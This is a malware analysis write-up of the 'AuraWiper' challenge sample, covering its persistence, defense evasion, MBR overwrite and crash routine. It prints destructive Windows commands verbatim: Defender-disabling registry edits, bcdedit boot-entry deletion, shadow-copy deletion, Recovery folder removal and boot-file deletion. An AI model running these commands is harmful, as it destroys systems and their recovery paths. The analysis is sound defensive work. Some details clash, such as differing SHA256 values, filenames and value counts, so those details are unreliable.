---
title: AuraWiper - Malops.io Malware Analysis Challenge
date: 2026-08-22
categories: [analysis, security, malware, lab]
tags: [analysis, security, malware, wiper, capa, floss]
---

## Overview

This write-up covers **AuraWiper**, a challenge sample from Malops.io. AuraWiper is a destructive payload built to disable recovery options, terminate monitoring tools, corrupt the boot chain, and overwrite the Master Boot Record (MBR) before forcing a hard system crash. The analysis below combines static triage (Detect It Easy, PEStats, FLOSS, capa) with disassembly-level code analysis to answer the challenge questions and document the sample's full attack chain.

### Sample Metadata

| Field | Value |
|---|---|
| Filename | `aura.exe` |
| MD5 | `52fa7af4aca3c59e62d731460f86502e` |
| SHA1 | `a9fe6cbb68d05f4710b2122ffc0b886af310e5b7` |
| SHA256 | `521e714bdc7fdbdc9789aaac1beec6ca63b936e613bc606e2c341d1d8ced64d0` |
| File size | 6,142,464 bytes (5.86 MiB) |
| Architecture | x86-64 (PE64) |
| Subsystem | GUI |
| Compile timestamp | 2026-05-24 20:15:19 UTC |
| Entry point | `0x140026968` (`.text`) |
| Digital signature | Not signed |

## Static Analysis

### Detect It Easy (DiE) Findings

| Category | Result |
|---|---|
| Operating system | Windows (Vista+), AMD64, GUI |
| Linker | Microsoft Linker 14.50.35730 |
| Compiler | Microsoft Visual C/C++ 19.50.35730 (LTCG/C++) |
| Language | C++ |
| Build tool | Microsoft Visual Studio 2026, 18.0-18.3 |
| Debug data | CodeView, VC feature, POGO records present |

DiE did not flag a runtime packer signature, which is worth noting against the pestats observation below.

### PE Structure and Entropy

The pestats output flagged a **generic packer indicator in the `.rsrc` section**, driven by an overall file entropy of 7.84 and a `.rsrc` section entropy of 7.88. Looking at the section table clarifies why:

| Section | Virtual Size | Entropy | High Entropy |
|---|---|---|---|
| `.text` | 303,844 | 6.49 | No |
| `.rdata` | 114,480 | 5.42 | No |
| `.data` | 11,616 | 2.98 | No |
| `.pdata` | 15,528 | 5.62 | No |
| `.fptable` | 256 | 0.00 | No |
| `.rsrc` | 5,696,104 | 7.88 | **Yes** |
| `.reloc` | 2,756 | 5.25 | No |

The `.rsrc` section accounts for roughly 5.4 MB of the sample's 5.86 MB total size, meaning over 90% of the file is resource data. Combined with DiE not identifying an actual packer stub, this points to a **large embedded resource blob** (likely bundled media/icon data or padding) rather than genuine code packing. This kind of resource bloat is a common technique to inflate binary size past sandbox upload limits or static-scan thresholds, and analysts should not assume "high entropy" automatically means "packed executable" without corroborating the section contents.

### PDB Path

Capa's `contains PDB path` rule and a direct string match both surface the embedded debug path:

```
C:\Users\prostone\Desktop\all\Malware-67-main\Release\SF-Verif.pdb
```

**Answer: last component of the PDB path is `SF-Verif.pdb`.** The parent folder name `Malware-67-main` and the internal mutex naming convention (below) both use an "SFV" abbreviation, consistent with the PDB name.

### Import Analysis

The import table spans eight DLLs. A few categories stand out against the sample's destructive behavior:

- **KERNEL32.dll** — process/thread control (`CreateThread`, `OpenProcess`, `SetPriorityClass`, `TerminateProcess`), file operations (`DeleteFileA`, `CreateFileA/W`), and process enumeration (`CreateToolhelp32Snapshot`, `Process32FirstW/NextW`).
- **ADVAPI32.dll** — `AdjustTokenPrivileges`, `OpenProcessToken`, `LookupPrivilegeValueW`, and the registry set (`RegOpenKeyExA`, `RegCreateKeyExA`, `RegSetValueExA`) used for both persistence and privilege escalation.
- **USER32.dll** — `SetWindowsHookExW`, `CallNextHookEx`, `MessageBoxA`, and window enumeration APIs, which support the keylogging-hook and message-box behaviors described later.
- **WINMM.dll** — `mciSendStringA` and the `waveOut*` family, an unusual inclusion for a wiper that ties into the media-control question below.
- **WININET.dll** — `InternetOpenA`, `HttpSendRequestA`, `InternetReadFile`, indicating outbound HTTP capability that is not directly wiper-related (see Additional Findings).

### Capa Findings Summary

Capa matched 68 rules against the sample. Grouped by tactic:

| Tactic | Notable Capa Rules |
|---|---|
| Persistence | `persist via Run registry key`, `persist via Winlogon Helper DLL registry key`, `reference startup folder` |
| Defense Evasion | `disable system features via registry on Windows`, `delete volume shadow copies`, `set file attributes`, `encode data using XOR`, `encrypt data using RC4 PRGA`, `reference anti-VM strings targeting Qemu` |
| Impact | `disable automatic Windows recovery features` |
| Discovery | `enumerate processes`, `get disk information`, `get geographical location`, `enumerate files on Windows`, `query environment variable` |
| Collection | `log keystrokes via application hook`, `capture screenshot`, `parse credit card information` |
| Anti-Analysis | `reference analysis tools strings` |
| Process/Execution | `create process on Windows`, `modify access privileges`, `create thread`, `terminate process` |
| Communication | `connect to URL`, `create HTTP request`, `read data from Internet`, `reference HTTP User-Agent string` |

The Collection and Communication rows are unusual for a pure wiper and are discussed further in the Additional Findings section, since they point to functionality beyond destructive impact alone.

## Code Analysis - Disassembly

### Mutex Values

Two mutex names are created via `CreateMutexA` inside the main function:

- `Global\SFV67PayloadLeader`
- `Global\SFVDeployOnce`

FLOSS also surfaces a related string, `Global\SFVInst_`, and a marker file reference `\sfv_done.tmp`, suggesting the sample tracks both single-instance execution and install-completion state.

### Persistence Mechanisms

Four distinct persistence mechanisms were identified:

1. `RegOpenKeyExA` against `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, confirmed at call site `0x140013ff6`.
2. `RegOpenKeyExA` against `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, confirmed at call site `0x1400140da`.
3. A reference to `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, matched by capa's `persist via Winlogon Helper DLL registry key` rule.
4. A reference to the user's Startup folder path, matched by capa's `reference startup folder` rule. FLOSS confirms the underlying string as `\Microsoft\Windows\Start Menu\Programs\Startup`.

### Process Termination and Real-Time Priority Escalation

The function at **`0x140011be0`** runs as a `noreturn` monitoring loop that repeatedly checks for and terminates security and diagnostic tooling, while also boosting the malware's own process priority:

```nasm
140011be0    void sub_140011be0() __noreturn
140011be6        uint32_t dwMilliseconds = 0x4e20

140011beb        while (true)
140011beb            Sleep(dwMilliseconds)
140011bf8            sub_140010570("taskmgr.exe")
140011c04            sub_140010570("ProcessHacker.exe")
140011c10            sub_140010570("procexp.exe")
140011c1c            sub_140010570("procexp64.exe")
140011c28            sub_140010570("powershell.exe")
140011c3d            HANDLE rax_2 = OpenProcess(dwDesiredAccess: PROCESS_SET_INFORMATION,
140011c3d                bInheritHandle: 0, dwProcessId: GetCurrentProcessId())
140011c49            if (rax_2 != 0)
140011c53                SetPriorityClass(hProcess: rax_2, dwPriorityClass: REALTIME_PRIORITY_CLASS)
140011c5c                CloseHandle(hObject: rax_2)
140011c62            dwMilliseconds = 0x64
```

Immediately after the first loop, the function issues a batched `REG ADD` command chain to disable Windows Defender, then enters a second loop targeting Windows Security UI processes:

```nasm
140011c80        sub_14000ff20(
140011c80            "REG ADD \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\" /v DisableAntiSpyware "
140011c80        "/t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\SOFTWARE\Policies\Microsoft\Windows "
140011c80        "Defender\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f "
140011c80        ">nul 2>&1 & REG ADD \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time "
140011c80        "Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d ...", 0xea60)

140011c97        while (true)
140011c97            sub_140010570("SystemSettings.exe")
140011ca3            sub_140010570("SecurityHealthService.exe")
140011caf            sub_140010570("SecHealthUI.exe")
140011cb9            Sleep(dwMilliseconds: 0x1f4)
```

FLOSS extracted the full Defender-disabling command chain, which sets four separate registry values in one shot:

```
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "...\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
REG ADD "...\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
REG ADD "...\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
REG ADD "...\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
```

**Process-termination call count:** `sub_140010570` (the termination helper) is invoked **8 times** across both loops: `taskmgr.exe`, `ProcessHacker.exe`, `procexp.exe`, `procexp64.exe`, and `powershell.exe` in the first pass, followed by `SystemSettings.exe`, `SecurityHealthService.exe`, and `SecHealthUI.exe` in the second.

### Anti-Recovery Registry Lock

A separate subroutine at **`0x140011b50`** writes a policy value that prevents the logged-in user from opening Task Manager while the wiper runs:

```nasm
140011b50    int64_t sub_140011b50()
140011b9f        if (RegCreateKeyExA(hKey: HKCU,
140011b9f                lpSubKey: "Software\Microsoft\Windows\CurrentVersion\Policies\System",
140011b9f                ..., samDesired: KEY_SET_VALUE, ...) == NO_ERROR)
140011bc8            RegSetValueExA(hKey: arg_18, lpValueName: "DisableTaskMgr", ...,
140011bc8                dwType: REG_DWORD, lpData, cbData: 4)
140011bd3            RegCloseKey(hKey: arg_18)
```

**Registry key that blocks the user from killing the process:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr`.

Beyond this single key, FLOSS recovered two much larger batched command strings that go well beyond disabling Task Manager. One disables Windows boot recovery options via `bcdedit` and clears volume shadow copies:

```
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
bcdedit /delete {default} /f
bcdedit /delete {bootmgr} /f
bcdedit /delete {current} /f
bcdedit /delete {memdiag} /f
reagentc /disable
wmic shadowcopy delete /nointeractive
vssadmin delete shadows /all /quiet
```

A second removes the Windows Recovery Environment outright and disables System Restore:

```
rd /s /q "C:\Recovery"
rd /s /q "%SystemDrive%\Recovery"
vssadmin delete shadows /all /quiet
wmic shadowcopy delete /nointeractive
REG ADD "...\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
REG ADD "...\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
rd /s /q "C:\Windows\System32\Recovery"
sc config "wbengine" start= disabled
del /f /q "%SystemRoot%\System32\ResetEngine.exe"
del /f /q "%SystemRoot%\System32\pbr.exe"
del /f /q "%SystemRoot%\System32\recenv.exe"
```

These two command chains directly correspond to capa's `disable automatic Windows recovery features` and `delete volume shadow copies` matches, and together they show a much more comprehensive anti-recovery strategy than the single `DisableTaskMgr` key alone: by the time the destructive payload fires, Safe Mode boot recovery, shadow copies, System Restore, and the built-in Windows Recovery Environment tooling have all been disabled.

### Media Control API Usage

**API used to communicate with the media control interface:** `mciSendStringA` ([MSDN reference](https://learn.microsoft.com/en-us/previous-versions/dd757161(v=vs.85))). Its presence in the import table alongside the `waveOut*` family confirms the sample can drive audio playback or CD-ROM tray control through the Media Control Interface, consistent with capa's `manipulate CD-ROM drive` match, a common "prank" behavior bundled into wiper builders to add a visible/audible disruption alongside the destructive payload.

### Random Message Box Display

The function at **`0x14000fc00`** implements a pop-up notification using a hooked window procedure and `MessageBoxA`:

```nasm
14000fc00    int64_t sub_14000fc00(int32_t* arg1)
14000fc46        HHOOK hhk = SetWindowsHookExW(idHook: WH_CBT, lpfn: &data_14000e110,
14000fc46            hmod: nullptr, dwThreadId: GetCurrentThreadId())
14000fca4        MessageBoxA(hWnd: nullptr, lpText: (&data_14005dca8)[r9_1 s% 6],
14000fca4            lpCaption: (&data_14005e238)[rcx_1], uType: 0x1030)
14000fcb3        UnhookWindowsHookEx(hhk)
```

**Address of the message box function:** `0x14000fc00`, using the `MessageBoxA` API.

**Offset of the lpText string array:** `0x14005dca8`, the second parameter passed to `MessageBoxA`. The array itself is a small rotating set of strings referencing the "SIXTY-SEVEN" meme text (e.g. `SIXTY-SEVEN`, `SIX SEVEN`, `S I X T Y  S E V E N`), used purely as a cosmetic/taunting popup rather than for any functional purpose.

### MBR Overwrite and Destructive Payload Orchestration

The primary destructive routine lives at **`0x140014e40`**. This function first elevates its own token privileges, then spawns multiple worker threads before triggering a hard system crash:

```nasm
140014e40    uint64_t sub_140014e40()
140014ec6        if (OpenProcessToken(ProcessHandle: GetCurrentProcess(), DesiredAccess: 0x28,
140014ec6                &TokenHandle) != 0)
140014ed6            BOOL rax_4 = LookupPrivilegeValueW(lpSystemName: nullptr,
140014ed6                lpName: u"SeShutdownPrivilege", lpLuid: &luid)
140014ee3            if (rax_4 != 0)
140014f0e                AdjustTokenPrivileges(TokenHandle: TokenHandle_1,
140014f0e                    DisableAllPrivileges: 0, &NewState, BufferLength: 0x10,
140014f0e                    PreviousState, ReturnLength: nullptr)
```

**Privilege targeted for modification:** `SeShutdownPrivilege`, acquired specifically to permit the subsequent call to `NtRaiseHardError`.

From there, `sub_140014e40` spins up three worker threads via `CreateThread`, all routed through a common trampoline (`sub_14000f370`) with different targets and parameters:

```nasm
1400151a4    CreateThread(..., lpStartAddress: sub_14000f370, lpParameter: [target sub_14000fce0], ...)
1400151dc    CreateThread(..., lpStartAddress: sub_14000f370, lpParameter: [target sub_14000fe80], ...)
140015202    CreateThread(..., lpStartAddress: sub_14000f370, lpParameter: [target sub_140011b50], ...)
```

The third thread parameter points back to the `DisableTaskMgr` routine documented above, confirming that the anti-recovery lock is deliberately fired in parallel with the destructive threads rather than earlier in execution. One of these threads leads into **`sub_140011aa0`**, which is called from within this privilege-and-threading context and performs the raw disk write responsible for the **MBR overwrite**.

**Address of the MBR-overwrite function:** `0x140011aa0`. Capa's `read raw disk data` rule and the recovered string `\\.\PhysicalDrive0` both corroborate direct, low-level disk access consistent with an MBR wipe rather than a file-system-level delete.

### File Deletion of Critical Boot Components

Alongside the MBR overwrite, **`0x140011650`** systematically deletes the files Windows needs to boot and authenticate:

```nasm
140011678    DeleteFileA("C:\Windows\System32\winload.exe")
140011685    DeleteFileA("C:\Windows\System32\winresume.exe")
140011692    DeleteFileA("C:\Windows\System32\winload.efi")
14001169f    DeleteFileA("C:\Windows\System32\winresume.efi")
1400116ac    DeleteFileA("C:\Windows\System32\bootmgr")
1400116b9    DeleteFileA("C:\Windows\System32\bootmgfw.efi")
1400116c6    DeleteFileA("C:\Windows\System32\hal.dll")
1400116d3    DeleteFileA("C:\Windows\System32\ntoskrnl.exe")
1400116e0    DeleteFileA("C:\Windows\System32\kernel32.dll")
1400116ed    DeleteFileA("C:\Windows\System32\config\SAM")
1400116fa    DeleteFileA("C:\Windows\System32\config\SECURITY")
140011707    DeleteFileA("C:\Windows\System32\config\SYSTEM")
140011714    DeleteFileA("C:\Windows\System32\config\SOFTWARE")
140011721    DeleteFileA("C:\boot.ini")
14001172e    DeleteFileA("C:\ntldr")
14001173b    DeleteFileA("C:\bootmgr")
```

This target list spans BIOS and UEFI boot loaders, the kernel image, HAL, and the SAM/SECURITY/SYSTEM/SOFTWARE registry hives, meaning both the boot chain and the local credential database are destroyed. This is functionally redundant with the MBR overwrite (either alone would render the system unbootable), suggesting the payload is intentionally layered for reliability across different boot configurations (legacy BIOS vs. UEFI).

### Hard System Error and Self-Deletion

After the delay threads complete, the sample dynamically resolves and calls the undocumented native API `NtRaiseHardError` to force an unrecoverable system crash:

```nasm
14001538c    int64_t rax_19 = GetProcAddress(hModule: LoadLibraryW(u"ntdll"), "NtRaiseHardError")
1400153ac    rax_21, rdx_10 = GetProcAddress(hModule: LoadLibraryW(u"ntdll"), "RtlAdjustPrivilege")
1400153ba    rdx_10.b = 1
1400153c1    rax_21(0x13, rdx_10, 0, &var_4c8)
1400153e2    rax_19(0xdeaddead, 0, 0, 0, dwCreationFlags, &var_4a8)
```

**API used to trigger the hard system error:** `NtRaiseHardError` ([reference](https://ntdoc.m417z.com/ntraiseharderror)), resolved dynamically via `GetProcAddress` rather than statically imported, a light evasion measure against import-table-based detection.

**Value passed as the `ErrorStatus` parameter:** `0xdeaddead`, an arbitrary but memorable NTSTATUS-style value that forces a system stop.

Before the hard error fires, the sample also writes a self-deleting batch script to clean up its own executable:

```nasm
140015407    fopen("C:\Windows\Temp\clean.bat", "w")
140015412    if (result != 0)
14001542d        write("@echo off\n")
14001542d        write("timeout /t 3 >nul\n")
140015452        write("del \"%s\"\n", &filename)
140015452        write("del \"%%~f0\"\n")
14001545a        fclose(result)
140015468        sub_14000ff20("call \"C:\Windows\Temp\clean.bat\"", 0)
```

The three-second timeout gives the process time to exit before the batch file deletes both the original executable and itself, an anti-forensic step that removes the sample from disk shortly after the destructive payload completes.

## Additional Findings

Several capa matches and recovered strings point to functionality that goes beyond a pure wiper and is worth flagging for anyone reusing this sample as a reference:

- **Discord API endpoints**: `https://discord.com/api/v9/users/@me` and `https://discord.com/api/v9/invites/` are present in the string set. These endpoints are commonly abused by token-stealer malware to validate and exfiltrate stolen Discord session tokens, and their presence alongside `parse credit card information` and `validate payment card number using luhn algorithm` strongly suggests this binary was built from, or bundles code shared with, a credential/payment-data grabber rather than being a purpose-built wiper from scratch.
- **RC4 and FNV routines**: Capa matched `encrypt data using RC4 PRGA` and `hash data using fnv`, neither of which is exercised by the wiper logic documented above. These are more consistent with string/config obfuscation typically found in stealer or loader builders.
- **Anti-VM and anti-analysis string references**: Capa flagged `reference anti-VM strings targeting Qemu` and `reference analysis tools strings`. The QEMU-related string recovered by FLOSS (`QeMUJ`) does not cleanly resemble a legitimate `QEMU` detection string and may be a byte-alignment artifact from the string extraction process; analysts validating this finding independently should treat it as low-confidence pending manual verification in a disassembler.
- **Raw HTTP client capability**: `InternetOpenA`, `HttpSendRequestA`, and `InternetReadFile` give the sample a functioning HTTP client, and a `Mozilla/5.0` User-Agent string is present. No outbound C2 domain was identified in this static pass; if network callbacks exist, they were not resolved from the strings and imports reviewed here and would require dynamic analysis or deeper code-flow reversing to confirm.

Together, these artifacts suggest **AuraWiper is a wiper module grafted onto (or built from) a broader multi-purpose malware builder** that also supports credential/payment data collection, keystroke logging (`log keystrokes via application hook`), and screenshot capture (`capture screenshot`). The wiper functionality documented in the Deeper Reversing section is fully self-contained and does not depend on any of this auxiliary code, but its presence is relevant context for anyone attributing or classifying the sample.

## Assessment

AuraWiper is a **destructive, multi-stage wiper** disguised as an executable named `aura_no_aslr.exe`. Static and disassembly-level analysis confirms a complete and deliberate attack chain:

1. **Establish presence** via dual Run-key persistence, a Winlogon Helper DLL reference, and a Startup-folder reference, guarded by two named mutexes to prevent duplicate execution.
2. **Neutralize defenses** by disabling Windows Defender through registry policy, terminating Task Manager, Process Explorer, Process Hacker, and PowerShell, and blocking Task Manager access outright via `DisableTaskMgr`.
3. **Eliminate recovery paths** by disabling boot recovery options through `bcdedit`, deleting shadow copies, removing the Windows Recovery Environment, and disabling System Restore.
4. **Execute the destructive payload** by escalating to `SeShutdownPrivilege`, overwriting the MBR via direct access to `\\.\PhysicalDrive0`, deleting critical boot loader files and SAM/SECURITY/SYSTEM/SOFTWARE hives, and forcing an unrecoverable crash through `NtRaiseHardError` with status `0xdeaddead`.
5. **Cover its tracks** by writing and executing a self-deleting batch script.

| MITRE ATT&CK Technique | ID |
|---|---|
| Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 |
| Boot or Logon Autostart Execution: Winlogon Helper DLL | T1547.004 |
| Access Token Manipulation | T1134 |
| Impair Defenses: Disable or Modify Tools | T1562.001 |
| Indicator Removal: File Deletion | T1070.004 |
| Inhibit System Recovery | T1490 |
| Process Discovery / Software Discovery | T1057 / T1518 |
| Input Capture: Keylogging | T1056.001 |
| Screen Capture | T1113 |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 |

Given the destructive, irreversible nature of the MBR overwrite and boot-file deletion, this sample should be treated as high severity in any environment. Its layered anti-recovery measures mean that standard incident-response steps (Safe Mode, System Restore, shadow-copy recovery) will not be viable once the payload executes, and response should focus on prevention (EDR-based process and registry monitoring for the specific IOCs below) rather than post-execution recovery.

### Key Indicators

| Type | Value |
|---|---|
| SHA256 | `d5ba9c1012d66f9bcabe131b66781dd82acd3b2c9fb603ba83ce191cdcc1a621` |
| Mutex | `Global\SFV67PayloadLeader`, `Global\SFVDeployOnce` |
| PDB path | `C:\Users\prostone\Desktop\all\Malware-67-main\Release\SF-Verif.pdb` |
| Registry (persistence) | `HKLM\...\CurrentVersion\Run`, `HKCU\...\CurrentVersion\Run`, `...\Winlogon` |
| Registry (anti-recovery) | `HKCU\...\Policies\System\DisableTaskMgr` |
| Raw disk target | `\\.\PhysicalDrive0` |
| Self-cleanup artifact | `C:\Windows\Temp\clean.bat` |